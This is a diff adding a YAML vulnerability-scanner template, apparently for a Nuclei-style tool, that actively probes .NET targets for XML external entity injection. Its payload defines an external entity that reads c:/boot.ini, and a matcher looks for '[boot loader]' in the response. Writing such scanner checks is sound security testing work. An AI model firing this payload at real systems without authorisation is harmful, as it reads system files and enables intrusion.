@@ -1,0 +1,21 @@
+id: patt-xxe-win-01-data
+name: 'PATT xxe patt-xxe-win-01 via data'
+severity: critical
+type: active
+tags:
+  - xxe
+  - patt
+requires:
+  - dotnet
+description: 'PATT XXE Windows boot.ini. [patt:patt-xxe-win-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      data:
+        - '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[boot loader]'
